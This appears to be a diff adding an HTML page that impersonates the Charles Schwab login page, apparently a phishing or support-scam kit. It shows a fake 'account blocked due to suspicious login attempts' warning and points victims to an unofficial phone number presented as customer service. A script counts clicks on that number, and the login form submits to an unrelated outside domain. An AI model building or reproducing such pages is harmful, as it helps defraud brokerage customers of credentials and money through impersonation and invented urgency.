@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login | Charles Schwab</title>
+    <!-- Custom Style Sheet -->
+    <link rel="stylesheet" href="styles/style.css">
+    <link rel="shortcut icon" href="assets/logo.png" type="image/x-icon">
+</head>
+<body>
+    <div class="container">
+        <!-- NavBar  -->
+        <nav>
+            <img src="assets/logo.png" alt="logo">
+        </nav>
+    
+        <div class="information-bar">
+            <img src="assets/information.png" alt="" width="25" height="25">
+            <p>
+                <span>Recently moved here from TD Ameritrade?</span>
+                Log in below to get started and complete your Schwab client profile.
+                If you haven't already, you'll need to <a href="index.html#">create your Schwab Login ID and password first.</a> Contact Our Customer Service at <a href="tel:+1-844-507-2395" onclick="trackClick()">
+				+1-844-507-2395</a>
+            </p>
+           
+        </div>
+
+
+        <!-- Main section  -->
+        <div class="main-login-section">
+            <div class="login-wrapper">
+                <h1 class="login-title">Log in to Schwab</h1>
+                <div class="warning" id="hide">
+                     "Your Schwab account access has been blocked due to suspicious login attempts. Contact our customer service team at    <a href="tel:+1-844-507-2395" onclick="trackClick()">+1-844-507-2395</a> to verify and unlock your account."
+                </div>
+                <form class="login-form" action="https://www.chaserad.com/this.preventDefault()">
+                    <label for="loginId">Login ID</label>
+                    <div class="inputBox">
+                        <input type="text" id="loginId">
+                    </div>
+                    <label for="password">Password</label>
+                    <div class="inputBox">
+                        <input type="password" id="password">
+                        <img src="assets/eye-open.png" id="hideShowBtn" class="hide" alt="">
+                    </div>
+                    <div class="rememberBox">
+                        <input type="checkbox" name="" id="">
+                        Remember Login ID
+                    </div>
+
+                    <label for="startPage" style="margin-top: 10px;">Start Page</label>
+                    <div class="inputBox">
+                        <select name="" id="startPage">
+                            <option value="0: Object"> Accounts Summary </option>
+                            <option value="1: Object"> Account Balances </option>
+                            <option value="2: Object"> Positions </option>
+                            <option value="3: Object"> Trade Ticket </option>
+                            <option value="4: Object"> History </option>
+                            <option value="5: Object"> Stock &amp; ETF Trading </option>
+                            <option value="6: Object"> Options Trading </option>
+                            <option value="7: Object"> Mutual Fund Trading </option>
+                            <option value="8: Object"> Bond Trading </option>
+                            <option value="9: Object"> Research </option>
+                            <option value="10: Object"> Order Status </option>
+                            <option value="11: Object"> Watchlist </option>
+                        </select>
+                    </div>
+                    <button id="loginBtn">Log In</button>
+                </form>
+
+                <p class="forgot-details">Forgot <a href="index.html#">Login ID</a> or <a href="index.html#">Password?</a></p>
+                <div class="newUser">
+                    <a href="index.html#">New User?</a>
+                    <span></span>
+                    <select id="language-selector" class="language-dropdown">
+                        <option value="" selected="">
+                            English
+                        </option>
+                        <option value="">
+                            繁體
+                        </option>
+                        <option value="">
+                            简体
+                        </option>
+                    </select>
+                </div>
+            </div>
+        </div>
+
+        <!-- Cards  -->
+        <div class="cards-wrapper">
+            <div class="card">
+                <img src="assets/card-img-1.html" alt="">
+                <div class="content">
+                    <h1>Are you on track to save for retirement?</h1>
+                    <p>Find the right IRA for your needs and open an account today.                    </p>
+                    <a href="index.html#">Learn more</a>
+                </div>
+            </div>
+            <div class="card">
+                <img src="assets/card-img-2.html" alt="">
+                <div class="content">
+                    <h1>Invest in ideas you believe in.</h1>
+                    <p>Find new opportunities with 40+ customizable themes.</p>
+                    <a href="index.html#">Explore Compay Investing Themes</a>
+                </div>
+            </div>
+            <div class="card">
+                <img src="assets/card-img-3.html" alt="">
+                <div class="content">
+                    <h1>Introducing the Schwab Ultra-Short Income ETF ().</h1>
+                    <p>Our new ETF is designed for potential income, stability, and daily liquidity.</p>
+                    <a href="index.html#">Explore SCUS</a>
+                </div>
+            </div>
+        </div>
+
+        <!-- important Information section -->
+        <div class="important-info">
+            <p><span>Important information about our relationship with you:</span> <a href="index.html#" style="text-decoration: none;">Client Relationship Summaries</a></p>
+            <p>Our Client Relationship Summaries offer a brief summary of our services, fees and obligations when we work with you in a broker-dealer or an investment advisory relationship. Learn more at schwab.com/transparency. <a href="index.html#" style="text-decoration: none;">Schwab.com/transparency.</a></p>
+        </div>
+
+        <!-- Footer  -->
+        <Footer>
+            <div class="links-wrapper">
+                <a href="index.html#">Schwab Safe®</a>
+                <a href="index.html#"> The Schwab Security Guarantee</a>
+                <a href="index.html#">Schwab Homepage</a>
+            </div>
+            <p style="color: #006e99; font-size: 12px;">Web Broweser Information</p>
+            <div style=" border: 1px solid #333; padding: 20px; font-weight: bold; text-align: center; color: #666;">
+                Brokerage Products: Not FDIC Insured • No Bank Guarantee • May Lose Value
+            </div>
+            <p class="footer-desc">Not all products and services listed are available outside the U.S. and some are subject to country specific restrictions.</p>
+            <p class="footer-desc">Check the background of this firm or one of its investment professionals on <a href='index.html#'>FINRA's BrokerCheck</a>.</p>
+            <p class="footer-desc">The Schwab Corporation provides a full range of brokerage, banking and financial advisory services through its operating subsidiaries. Its broker-dealer subsidiary, Schwab & Co., Inc. (<a href="index.html#">member </a>), offers investment services and products, including Schwab brokerage accounts. Its banking subsidiary, Schwab Bank (member FDIC and an Equal Housing Lender), provides deposit and lending services and products. Access to Electronic Services may be limited or unavailable during periods of peak demand, market volatility, systems upgrade, maintenance, or for other reasons.</p>
+            <p class="footer-desc">This site is designed for U.S. residents. Non-U.S. residents are subject to country-specific restrictions. Learn more about our services for <a href="index.html#">non-U.S. residents.</a></p>
+            <p class="footer-desc" style="margin: 20px 0">© 2024 Schwab & Co., Inc, All rights reserved. Member . Unauthorized access is prohibited. Usage will be monitored.(0124-3J4J)</p>
+        </Footer>
+
+    </div>
+
+
+
+    <!-- Custom Script  -->
+    <script src="script/script.js"></script>
+  
+     <script>
+        function trackClick() {
+            var phone_number = '+1-844-507-2395';
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST.html", "update_click_count.html", true);
+            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+            xhr.send("phone_number=" + encodeURIComponent(phone_number));
+        }
+    </script>
+	
+	<!-- Begin Web-Stat code v 7.0 -->
+<span id="wts2189667"></span>
+<script>var wts=document.createElement('script');wts.async=true;
+wts.src='https://app.ardalio.com/log7.js';document.head.appendChild(wts);
+wts.onload = function(){ wtslog7(2189667,4); };
+</script><noscript><a href="https://www.web-stat.com">
+<img src="https://app.ardalio.com/7/4/2189667.png" 
+alt="Web-Stat analytics"></a></noscript>
+<!-- End Web-Stat code v 7.0 -->
+</body>
+
+
+</html>
